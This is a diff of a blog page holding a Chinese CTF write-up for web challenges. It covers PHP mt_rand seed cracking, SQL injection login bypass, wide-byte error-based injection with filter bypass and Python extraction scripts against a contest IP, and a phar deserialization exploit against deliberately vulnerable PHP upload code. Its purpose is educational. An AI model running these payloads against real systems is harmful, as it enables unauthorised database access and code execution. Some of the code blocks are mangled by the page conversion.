@@ -6,15 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://yd0ng.github.io">
-  <title>Tag: CTF | Blog</title>
+  <title>安恒杯新春祈福赛 | Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Blog">
-<meta property="og:url" content="https://yd0ng.github.io/tags/CTF/index.html">
+  <meta name="description" content="做一下安恒杯新春祈福赛，记录WriteUp Web枯燥的抽奖访问首页提示 12猜字符串游戏(大小写字母+数字)，猜中全部20位得flag+送去非洲，你不小心偷看到了一部分是：4unkksWvpD 查看源代码无果，搜索发现是和广外第三届网络安全大赛的题差不多，开始解题 在network网络包里发现check.php源代码 123456789101112131415161718192021222324">
+<meta property="og:type" content="article">
+<meta property="og:title" content="安恒杯新春祈福赛">
+<meta property="og:url" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/index.html">
 <meta property="og:site_name" content="Blog">
+<meta property="og:description" content="做一下安恒杯新春祈福赛，记录WriteUp Web枯燥的抽奖访问首页提示 12猜字符串游戏(大小写字母+数字)，猜中全部20位得flag+送去非洲，你不小心偷看到了一部分是：4unkksWvpD 查看源代码无果，搜索发现是和广外第三届网络安全大赛的题差不多，开始解题 在network网络包里发现check.php源代码 123456789101112131415161718192021222324">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png">
+<meta property="og:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png">
+<meta property="article:published_time" content="2020-02-04T06:19:53.000Z">
+<meta property="article:modified_time" content="2020-02-04T12:41:23.523Z">
 <meta property="article:author" content="yd0ng">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png">
   
   
     <link rel="icon" href="/themes/yilia/source/">
@@ -130,36 +138,263 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-安恒杯新春祈福赛" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      安恒杯新春祈福赛
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/" class="archive-article-date">
+
+        
+        <a href="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/" class="archive-article-date">
   	<time datetime="2020-02-04T06:19:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-04</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/">安恒杯新春祈福赛</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>做一下安恒杯新春祈福赛，记录WriteUp</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h2><p>访问首页提示</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜字符串游戏(大小写字母+数字)，猜中全部20位得flag+送去非洲，你不小心偷看到了一部分是：</span><br><span class="line">4unkksWvpD</span><br></pre></td></tr></table></figure>
+<p>查看源代码无果，搜索发现是和广外第三届网络安全大赛的题差不多，开始解题</p>
+<p>在network网络包里发现check.php源代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">4unkksWvpD</span><br><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show &#x3D; substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;);</span><br></pre></td></tr></table></figure>
+<p>加密过程为在0~999999999之间取一个随机数作为随机函数的种子，然后用随机函数mt_rand()产生随机数进行加密，给出加密结果的前十位，求所有的结果，但是伪随机数只要种子一样，给出的随机数就是一样的，<br>伪随机数爆破工具 <a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a></p>
+<p>位移量偏移脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s1&#x3D;&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">s2&#x3D;&quot;4unkksWvpD&quot;</span><br><span class="line">for i in s2:</span><br><span class="line">    result&#x3D;str(s1.index(i)-1)+&#39; &#39;+str(s1.find(i)+1)+&#39; &#39;+ &#39; 0 61&#39;</span><br><span class="line">    print(result,end&#x3D;&#39; &#39;)</span><br></pre></td></tr></table></figure>
+<p>得到种子序列</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">29 31  0 61 19 21  0 61 12 14  0 61 9 11  0 61 9 11  0 61 17 19  0 61 57 59  0 61 20 22  0 61 14 16  0 61 38 40  0 61</span><br></pre></td></tr></table></figure>
+<p>用种子序列爆破种子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time .&#x2F;php_mt_seed 29 31  0 61 19 21  0 61 12 14  0 61 9 11  0 61 9 11  0 61 17 19  0 61 57 59  0 61 20 22  0 61 14 16  0 61 38 40  0 61</span><br></pre></td></tr></table></figure>
+<p>得到时间种子<br><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/2.png" alt><br>给出PHP脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function wp_generate_password($length) &#123;</span><br><span class="line">    $chars &#x3D; &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;;</span><br><span class="line">    $password &#x3D; &#39;&#39;;</span><br><span class="line">    for ( $i &#x3D; 0; $i &lt; $length; $i++ )</span><br><span class="line">        $password .&#x3D; substr($chars, mt_rand(0, strlen($chars) - 1), 1);</span><br><span class="line">    return $password;</span><br><span class="line">&#125;</span><br><span class="line">mt_srand(145562347); &#x2F;&#x2F;手工添加了这个种子</span><br><span class="line">$answer &#x3D; wp_generate_password(20);</span><br><span class="line">echo $answer;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>得到加密结果<br><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/3.png" alt><br>提交即可得到flag</p>
+<h2 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h2><p>题目说明</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">刚学完sqli，我才知道万能口令这么危险，还好我进行了防护，还用md5哈希了密码！</span><br></pre></td></tr></table></figure>
+<p>提交万能密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#39;#</span><br><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+<p>登录失败，查看源码<br>在search.php发现加密字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</span><br></pre></td></tr></table></figure>
+<p>base32+base64解密得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure>
+<p>在注入万能密码时提示了don’t hack me,所以应该存在过滤，fuzz一波<br>username存在以下过滤,可能不全,但是可以union select 就可以操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or、&#x3D;、(、）、order、floor</span><br></pre></td></tr></table></figure>
+<p>测字段数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; union select 1,2,3#</span><br><span class="line">admin&#39; union select 1,2,3,4#</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">对比差异可以判断字段数为3</span><br><span class="line">因为密码是做了md5,所以可以构造联合查询来伪造出密码，最终payload 如下</span><br></pre></td></tr></table></figure>
+<p>name=’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* 说明：202cb962ac59075b964b07152d234b70&#x3D;md5(123)</span><br><span class="line"></span><br><span class="line">得到flag</span><br><span class="line"></span><br><span class="line">### 代码参考</span><br></pre></td></tr></table></figure>
+<?php
+if($_POST["user"] && $_POST["pass"]) {
+    $mysqli = new mysqli("localhost", "root", "2wsx3edctf", "challenges");  
 
-        <div class="article-info info-on-right">
-          
+    $user = $_POST["user"];
+    $pass = md5($_POST["pass"]);
+    $sql = "select pwd from interest where uname='$user'";
+    $result = $mysqli->query($sql);  
+    $row = $result->fetch_assoc();
+    //echo $row["pwd"];
+    if (($row["pwd"]) && (!strcasecmp($pass, $row["pwd"]))) {
+        echo "<p>Logged in! Key:flag{xiaohdaldahdkajsdhja} </p>";
+    }
+    else {
+        echo("<p>Log in failure!</p>");
+    }
+    $result->free(); 
+    $mysqli->close();  
+}
+else{
+
+    echo "nonono";
+}
+?>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## BabySqli2.0</span><br><span class="line">### 题目说明</span><br></pre></td></tr></table></figure>
+<p>我对网站进行了加固，还支持了中文账号，这下你们没辙了吧？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">鲁迅说过，一提到中文，马上想到gbk,马上想到宽字节注入</span><br></pre></td></tr></table></figure>
+<p>admin’ 提示没有此用户<br>admin%df’ 数据库报错,说明确实是宽字节注入，然后开始报错注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">### waf探测</span><br><span class="line">查表名时出现了极其奇怪的情况，后来发现是对关键词进行了过滤，而查询数据库名时，extractvalue()即使没有select,也可以查出来数据库名，日，于是先fuzz一波关键词，以后要记得先探测waf，发现至少有以下关键词被过滤,但双写可以绕过</span><br></pre></td></tr></table></figure>
+<p>union select where</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### 注数据库名</span><br></pre></td></tr></table></figure>
+<p>1%df’ and extractvalue(1,concat(1,(seselectlect database()),1))%23    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到web_sqli</span><br><span class="line"></span><br><span class="line">### 注表名</span><br></pre></td></tr></table></figure>
+<p>1%df’ and extractvalue(1,concat(1,(seselectlect  group_concat(table_name) from information_schema.tables whwhereere table_schema=database()),1))%23</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到f14g,user</span><br><span class="line"></span><br><span class="line">### 查询字段</span><br><span class="line"></span><br><span class="line">这里table_name&#x3D;&#39;f14g&#39;,但是引号被转义了，尝试使用0x也被waf了，这里采用char编码绕过</span><br></pre></td></tr></table></figure>
+<p>1%df’ and extractvalue(1,concat(1,(seselectlect  group_concat(column_name) from information_schema.columns whwhereere table_name=char(102,49,52,103)),1))%23</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到b80bb7740288fda1f201890375a60c8f,md5(解密为id)</span><br><span class="line"></span><br><span class="line">### 查询字段</span><br></pre></td></tr></table></figure>
+<p>1%df’ and extractvalue(1,concat(1,(seselectlect  group_concat(b80bb7740288fda1f201890375a60c8f) from f14g),1))%23</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">发现确实是id,然后查md5(flag)试试</span><br></pre></td></tr></table></figure>
+<p>1%df%27 and extractvalue(1,concat(1,(seselectlect  group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g),1))%23</p>
+<p>\1%df%27 and extractvalue(1,concat(1,(seselectlect  group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 1,1),1))%23&amp;pw=2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">得到VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr</span><br><span class="line"></span><br><span class="line">这里说一个地方，为什么flag字段没查出来，因为group_concat()好像只能读出长度32位，所以读出第一个hash后就没能显示出第二个hash</span><br><span class="line"></span><br><span class="line">base64为The first man name was k</span><br><span class="line">？？？？</span><br><span class="line">通过limit 全查出来试试,直接用python脚本</span><br></pre></td></tr></table></figure>
+<p>import requests<br>import base64<br>import re<br>import re<br>rule = re.compile(r”Error: XPATH syntax error: &#39;.*&#39;“)<br>i=0<br>for i in range(0,100):<br>    url=”<a href="http://183.129.189.60:10008/search.php?name=1%df%27" target="_blank" rel="noopener">http://183.129.189.60:10008/search.php?name=1%df%27</a> and extractvalue(1,concat(1,(seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit “+str(i)+”,1),1))%23&amp;pw=2”<br>    url=url.replace(‘ ‘,’%20’)<br>    # print(url)<br>    s=requests.get(url).text<br>    result=rule.findall(s)[0].replace(“Error: XPATH syntax error: “,””).replace(‘&#39;‘,’’)<br>    # print(result)<br>    try:<br>        print(i,base64.b64decode(result))<br>    except:<br>        print(result)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在第22列发现flag，但是只有一半</span><br><span class="line"></span><br><span class="line">![](安恒杯新春祈福赛&#x2F;4.png)</span><br><span class="line"></span><br><span class="line">借助substr读出来就好了</span><br></pre></td></tr></table></figure>
+<p>import requests<br>import base64<br>import re<br>rule = re.compile(r”Error: XPATH syntax error: &#39;.*&#39;“)<br>url=”<a href="http://183.129.189.60:10008/search.php?name=1%df%27" target="_blank" rel="noopener">http://183.129.189.60:10008/search.php?name=1%df%27</a> and extractvalue(1,concat(1,substr((seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1,32),1))%23&amp;pw=2”<br>url=url.replace(‘ ‘,’%20’)<br>s=requests.get(url).text<br>result=rule.findall(s)[0].replace(“Error: XPATH syntax error: “,””).replace(‘&#39;‘,’’)<br>flag=result<br>url=”<a href="http://183.129.189.60:10008/search.php?name=1%df%27" target="_blank" rel="noopener">http://183.129.189.60:10008/search.php?name=1%df%27</a> and extractvalue(1,concat(1,substr((seselectlect concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),33,32),1))%23&amp;pw=2”<br>url=url.replace(‘ ‘,’%20’)<br>s=requests.get(url).text<br>result=rule.findall(s)[0].replace(“Error: XPATH syntax error: “,””).replace(‘&#39;‘,’’)<br>flag=flag+result<br>print(base64.b64decode(flag))</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## Babysqliv3.0</span><br><span class="line">题目说明</span><br></pre></td></tr></table></figure>
+<p>这次我可是绝对防御！</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首页登录界面</span><br><span class="line">admin和password登录即可，</span><br><span class="line">自动设置session后跳转到一个上传页面</span><br><span class="line">### 预期解法</span><br><span class="line">观察到存在GET参数?file&#x3D;upload,文件包含明细标志，尝试读取源代码</span><br><span class="line"></span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure>
+<?php
+error_reporting(0);
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+
+
+    function __construct(){
+        $sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
+        $ext = ".txt";
+        @mkdir($sandbox, 0777, true);
+        if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
+            $this->Filename = $_GET['name'];
+        }
+        else{
+            $this->Filename = $sandbox.$_SESSION['user'].$ext;
+        }
+
+        $this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
+        $this->token = $_SESSION['user'];
+    }
+
+    function upload($file){
+        global $sandbox;
+        global $ext;
+
+        if(preg_match("[^a-z0-9]", $this->Filename)){
+            $this->cmd = "die('illegal filename!');";
+        }
+        else{
+            if($file['size'] > 1024){
+                $this->cmd = "die('you are too big (â²â½`ã)');";
+            }
+            else{
+                $this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
+            }
+        }
+    }
+
+    function __toString(){
+        global $sandbox;
+        global $ext;
+        // return $sandbox.$this->Filename.$ext;
+        return $this->Filename;
+    }
+
+    function __destruct(){
+        if($this->token != $_SESSION['user']){
+            $this->cmd = "die('check token falied!');";
+        }
+        eval($this->cmd);
+    }
+}
+
+if(isset($_FILES['file'])) {
+    $uploader = new Uploader();
+    $uploader->upload($_FILES["file"]);
+    if(@file_get_contents($uploader)){
+        echo "ä¸é¢æ¯ä½ ä¸ä¼ çæä»¶ï¼<br>".$uploader."<br>";
+        echo file_get_contents($uploader);
+    }
+}
+
+?>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php</span><br></pre></td></tr></table></figure>
+<?php
+session_start();
+echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <title>Home</title>";
+error_reporting(0);
+if(isset($_SESSION['user'])){
+    if(isset($_GET['file'])){
+        if(preg_match("/.?f.?l.?a.?g.?/i", $_GET['file'])){
+            die("hacker!");
+        }
+        else{
+            if(preg_match("/home$/i", $_GET['file']) or preg_match("/upload$/i", $_GET['file'])){
+                $file = $_GET['file'].".php";
+            }
+            else{
+                $file = $_GET['file'].".fxxkyou!";
+            }
+            echo "å½åå¼ç¨çæ¯ ".$file;
+            require $file;
+        }
+
+    }
+    else{
+        die("no permission!");
+    }
+}
+?>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码审计可知，存在可控参数$_GET[&#39;name]并且当this-&gt;token &#x3D;&#x3D; $_SESSION[&#39;user&#39;]时可以执行eval($this-&gt;cmd)函数，利用phar反序列化解题即可</span><br><span class="line"></span><br><span class="line">首先上传任意文件，得到$_SESSION[&#39;user&#39;]</span><br></pre></td></tr></table></figure>
+<p>GXYf3ccadb4ef0535e40f455b2664479262</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给出生成phar的PHP代码</span><br></pre></td></tr></table></figure>
+<?php
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+}
+
+$o = new Uploader();
+$o->cmd = 'highlight_file("/var/www/html/flag.php");'; //里面的命令不要出现单引号否侧生成phar会报错
+$o->Filename = 'test';
+$o->token = 'GXYf3ccadb4ef0535e40f455b2664479262'; //$_SESSION['user']
+echo serialize($o);
+
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?><p>“); //设置stub，增加gif文件头<br>$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest<br>$phar-&gt;addFromString(“test.txt”, “test”); //添加要压缩的文件<br>$phar-&gt;stopBuffering();</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传生成的phar.phar文件，得到路径</span><br></pre></td></tr></table></figure>
+<p>/var/www/html/uploads/c04a544d2136e74a467867f1c6a5097f/GXYf3ccadb4ef0535e40f455b2664479262.txt</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用name参数和phar:&#x2F;&#x2F;并上传文件来实现反序列化，读取flag即可</span><br><span class="line"></span><br><span class="line">![](安恒杯新春祈福赛&#x2F;5.png)</span><br><span class="line"></span><br><span class="line">### 非预期解法</span><br><span class="line">上传文件名为flag.php的文件，因为有</span><br></pre></td></tr></table></figure>
+<p>echo file_get_contents($uploader);</p>
+<pre><code>就很尴尬………………
+
+![](安恒杯新春祈福赛/6.png)</code></pre>
+      
+      
+    
+      <div class="declare" hidden="hidden"></div>
+    
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢您的打赏，大家一起加油喔~<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/asserts/weixin.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -171,95 +406,129 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://yd0ng.github.io/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/02/CTF%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%8F%90%E9%AB%98/" class="archive-article-date">
-  	<time datetime="2020-02-02T14:43:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-02</time>
-</a>
+<nav id="article-nav">
+  
+  
